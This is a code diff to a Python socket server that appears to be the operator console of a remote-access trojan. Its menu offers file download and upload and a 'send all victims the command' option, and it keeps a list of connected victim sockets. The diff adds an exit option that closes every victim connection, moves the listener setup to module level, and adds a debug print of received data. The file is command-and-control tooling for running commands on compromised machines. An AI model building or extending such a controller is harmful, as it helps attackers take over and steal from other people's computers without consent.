@@ -9,15 +9,14 @@ PORT=12345
 FORMAT='UTF-8'
 list_of_clients:List[socket.socket]=[]
 client_counter=0
-
+server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+server.bind((HOST,PORT))
+server.listen()
 
 
 def connection_accepter():
     global client_counter
     print("server is starting")
-    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    server.bind((HOST,PORT))
-    server.listen()
     print(f"server is running on ip {HOST}")
     while True:
         conn,addr=server.accept()
@@ -34,6 +33,7 @@ def showing_menu():
     print("3.download a file")
     print("4.upload a file")
     print("5.send all victims the command")
+    print("6.exit")
 
 
 
@@ -112,6 +112,7 @@ def reciving_the_file(index:int,destination=str):
     done=False
     while not done:
         data=temp.recv(1024)
+        print(data)
         if file_bytes[-5:]==b"<END>":
             done=True
         else:
@@ -160,7 +161,12 @@ def program_handler():
         if(choice==5):
             command=getting_a_command()
             send_all_victims_the_command(command)
-
+        if(choice==6):
+            for temp in list_of_clients:
+                temp.close()
+            server.close()
+            exit()
+            
 
 
 
